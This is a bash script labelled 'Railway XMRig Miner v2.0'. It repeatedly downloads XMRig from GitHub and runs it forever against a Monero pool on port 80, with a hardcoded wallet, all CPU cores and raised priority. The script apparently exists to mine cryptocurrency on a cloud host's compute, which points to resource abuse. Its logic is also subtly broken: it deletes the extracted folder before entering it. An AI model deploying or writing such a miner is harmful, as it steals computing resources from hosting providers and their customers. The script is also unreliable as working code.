#!/bin/bash

echo "🚀 Railway XMRig Miner v2.0 starting at $(date)"
echo "Hostname: $(hostname)"
echo "CPU cores: $(nproc)"

# Infinite mining loop - NEVER exits
while true; do
  echo "📥 Downloading fresh XMRig..."
  
  # Download xmrig
  wget -q --timeout=30 -O xmrig.tar.gz \
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
  
  if [ ! -f xmrig.tar.gz ]; then
    echo "❌ Download failed, retry in 60s"
    sleep 60
    continue
  fi
  
  tar -xzf xmrig.tar.gz
  rm -rf xmrig-* || true
  cd xmrig-*
  
  if [ -f "./xmrig" ]; then
    chmod +x ./xmrig
    
    WORKER_ID="railway-$(hostname)-$(date +%s)"
    echo "⛏️ Starting mining: $WORKER_ID"
    echo "================ MINING START ================"
    
    # Run FOREVER - pipe all output to stdout for Railway logs
    exec ./xmrig \
      -o pool.hashvault.pro:80 \
      -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA \
      -p "$WORKER_ID" \
      --donate-level=1 \
      --threads=$(nproc) \
      --cpu-priority=2 \
      --print-time=60 \
      --no-color
      
  else
    echo "❌ xmrig binary missing, retry in 60s"
    sleep 60
  fi
done
